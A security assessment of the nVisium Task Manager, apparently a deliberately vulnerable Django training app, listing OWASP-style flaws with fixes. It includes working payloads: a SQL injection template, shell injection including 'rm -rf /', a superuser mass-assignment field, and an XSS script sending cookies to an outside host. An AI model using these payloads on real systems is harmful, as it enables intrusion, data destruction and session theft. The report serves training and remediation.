# Vulnerability Report on nVisium Task Manager

## Injection

### Exposure

Looked for vulnerabilities in any form view and found that the project file upload form directly includes form
input in SQL statements. The form exists at this url:

.../taskManager/<project_id>/upload/

and has a 'File Name' field where you can insert both SQL and shell commands.

#### Injecting SQL

```<filename>',(select <whatever you want> from <some table> where <some condition>),<your project id>);--```

With this line, you can inject SQL queries directly into the database and gain access to a variety
of information. For example, you get a user's email or (hashed) password, you can get usernames, you can get
information on projects and tasks. Tables I accessed:

* auth_user
* taskManager_project
* taskManager_task
* taskManager_userprofile
* taskManager_file

All of the information shows up in the file's path.

I tried:

```droptable',(select title from taskManager_project where id=10),10); Drop table taskManager_project;--```

to try and drop a table, but an exception was raised saying I could only execute one statement at a time.

#### Injecting shell commands

```; ls /```

Upload a file with this as the file name and you are shown all root directories and files.
You could potentially inject "; rm -rf /" which would delete everything on the system.

#### Repair

In the 'upload' view in taskManager/views.py:

To inhibit SQL injection, use Django's built in validation tools. Replace
```
curs = connection.cursor()
            curs.execute(
                "insert into taskManager_file ('name','path','project_id') values ('%s','%s',%s)" %
                (name, upload_path, project_id))
```
with
```
file = File(
    name=name,
    path=upload_path,
    project=proj
)

file.save()
```

To inhibit shell injection, don't name files based directly on user input. Replace
```
name = request.POST.get('name', False)
```
with
```
name = ''.join(random.choice(string.lowercase) for i in range(length))
```

## Broken Auth and Session Management

### Exposure

The UserForm built on the Django user class doesn't exclude the 'is_superuser' field.
In the browser, I added another input field to the registration form
```
<input name='is_superuser' type='checkbox' checked>
```
which made my new user a superuser. I can create new projects (I previously could but now I get
a button), I can manage permissions, etc.

### Repair

You could add 'is_superuser' to the 'excludes' blacklist, or you could explicitly state
which fields should be allowed. To do the latter, in UserForm within taskManager/forms.py, replace
```
exclude = ['groups', 'user_permissions', 'last_login', 'date_joined', 'is_active']
```
with
```
fields = ('username', 'first_name', 'last_name', 'email', 'password')
```

## Cross-site Scripting

### Exposure

In 'base_backend.html', the user's username is inserted into the html document with the 'safe' filter.
So any code in the username will be executed. I inserted:
```
myname</span><script>document.location= 'http://www.google.com?foo='+document.cookie</script>
```
as my username, but my browser console raised an error saying the XSS Auditor refused to execute the script
since it's source code was found in the request. But if I then just go somewhere else, say the homepage,
the page renders my username and in doing so runs the script redirecting me to google with the cookie attached.
A very similar script can be inserted into the create/edit task form with the same results.

A similar vulnerability exists in the search page where you can insert code into the href of the refresh button,
but I couldn't get around the XSS Auditor in this case.

### Repair

Really just get rid of the 'safe' filter.
In 'search.html', 'task_details.html', and 'base_backend.html', replace
```
{<some data> | safe}
```
with
```
{<some data>}
```

## Insecure Direct Object References

### Exposure

Other than a couple of protected pages, I can access any page I want and I can edit anything I want.
For example, I can access the admin's profile, change their email to mine, say I forgot my password, then change
their password and take over the account.

### Repair

There are quite a lot of view functions lacking user authentication. For each of these, the appropriate
check is required to ensure that the user has permission to view or do what they are trying to.

For example, in the project file 'upload' view, replace
```
if request.method == 'POST':

    proj = Project.objects.get(pk=project_id)
    form = ProjectFileForm(request.POST, request.FILES)

    ...

    return redirect('/taskManager/' + project_id +
                                '/', {'new_file_added': True})

else:
    form = ProjectFileForm()
return render_to_response(
    'taskManager/upload.html', {'form': form}, RequestContext(request))
```
with
```
if request.user.has_perm('project_edit'):
    if request.method == 'POST':

        proj = Project.objects.get(pk=project_id)
        form = ProjectFileForm(request.POST, request.FILES)

        ...

        return redirect('/taskManager/' + project_id +
                                '/', {'new_file_added': True})

    else:
        form = ProjectFileForm()
    return render_to_response(
        'taskManager/upload.html
else:
    return redirect('/taskManager/', {'permission': False})
```

Other permissions include:
* 'task_delete'
* 'task_edit'
* 'task_add'
* 'project_delete'
* 'project_edit'
* 'project_add'
* 'user_edit'

## Security Misconfiguration

### Exposure

In settings.py, DEBUG still equals True. For any deployed site it should be turned off.
The session storage backend is client side which gives hackers access to session ids.

### Repair

```DEBUG=True```
becomes
```DEBUG=False```

Remove
```
SESSION_ENGINE = "django.contrib.sessions.backends.signed_cookies"
SESSION_SERIALIZER = "django.contrib.sessions.serializers.PickleSerializer"
SESSION_COOKIE_HTTPONLY = False
```
and add
```'django.contrib.sessions'```
to your INSTALLED_APPS, then run
```./manage.py migrate```
to add the session table to the db. I don't have permission to migrate though.

## Sensitive Data Exposure

### Exposure
This app uses the MD5 algorithm to hash user passwords. This isn't good enough and can be beaten
by brute force.

### Repair
Simply use another algorithm. Django provides the BCrypt algo which is good.

Replace
```
PASSWORD_HASHERS = ['django.contrib.auth.hashers.MD5PasswordHasher']
```
with
```
PASSWORD_HASHERS = ['django.contrib.auth.hashers.BCryptPasswordHasher']
```

## Missing Function Level Access Control

### Exposure

This feels very similar to Insecure Direct Object References, but anyways, the idea is the same:
anytime sensitive data is requested or data is being changed, make sure the user should actually be
allowed to do that.

In the manage_groups view, anyone who's logged in can edit groups, but clearly that should only be for
high level users.

### Repair

After the initial check to see if the user is logged in, check to see that they have the right permission.
One way to do this is to insert
```
if not user.has_perm('can_change_group'):
    return redirect('/taskManager/', {'permission': False})
```
right
```
def manage_groups(request):

    user = request.user

    if user.is_authenticated():

        ---> HERE <---

        user_list = User.objects.order_by('date_joined')

        if request.method == 'POST':
            ...

    return redirect('/taskManager/', {'logged_in': False})
```

## Cross-site Request Forgery

### Exposure
I see some @csrf_exempt decorators...seems fishy. Theoretically I could make someone who has a verified session
attached to them send a request on my behalf (email link/xss) and do some nefarious stuff.

### Repair
Don't use the @csrf_exempt decorator. Now Django has you covered.